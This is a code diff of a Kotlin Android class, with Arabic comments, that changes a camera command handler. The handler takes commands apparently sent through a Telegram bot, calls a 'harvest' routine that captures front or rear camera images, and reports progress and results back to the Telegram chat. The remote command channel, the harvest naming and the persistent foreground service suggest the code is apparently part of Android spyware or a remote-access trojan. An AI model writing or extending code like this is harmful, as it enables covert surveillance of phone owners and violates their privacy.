@@ -773,7 +773,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر الكاميرا (مع إرسال نبض للخدمة الأمامية)
+    //  ✅ معالج أوامر الكاميرا (معدل لإرسال رسالة المعالجة أولاً)
     // ============================================================
 
     private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -796,15 +796,19 @@ class Commands private constructor(context: Context) {
 
             sendTelegramAction(tg, cid, "upload_photo")
 
+            // ✅ إرسال رسالة "جارٍ المعالجة" بدلاً من رسالة النجاح الفورية
+            sendTelegramMessage(tg, cid, "⏳ جارٍ الالتقاط والمعالجة...")
+
             scope.launch {
                 try {
                     invokeMethod(cameraAnalyzer, "harvest", isFront)
+                    // ✅ إرسال رسالة النجاح بعد اكتمال العملية
+                    sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها بنجاح.")
                 } catch (e: Exception) {
                     Log.e(TAG, "❌ Camera harvest error: ${e.message}")
+                    sendTelegramMessage(tg, cid, "❌ فشل في التقاط الصورة: ${e.message?.take(50)}")
                 }
             }
-
-            sendTelegramMessage(tg, cid, "📸 تم التقاط الصورة وتحليلها.")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Camera handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
